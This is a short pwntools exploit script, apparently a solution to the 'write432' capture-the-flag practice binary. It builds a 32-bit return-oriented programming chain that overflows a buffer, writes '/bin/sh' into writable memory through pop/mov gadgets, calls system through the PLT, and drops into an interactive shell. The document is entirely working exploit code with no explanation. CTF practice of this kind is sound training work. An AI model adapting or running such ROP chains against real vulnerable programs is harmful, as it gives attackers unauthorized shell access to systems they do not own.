from pwn import *

p = process("./write432")
pop_pop_ret_address = 0x080486da
mov_ret_address = 0x08048670
write_start_address = 0x804a028
system_plt_address = 0x08048430
payload = flat(["A"*(0x28+4), pop_pop_ret_address, write_start_address, "/bin", mov_ret_address, pop_pop_ret_address, write_start_address+4, "/sh\x00", mov_ret_address, system_plt_address, "B"*4, write_start_address])
p.sendline(payload)
p.interactive()
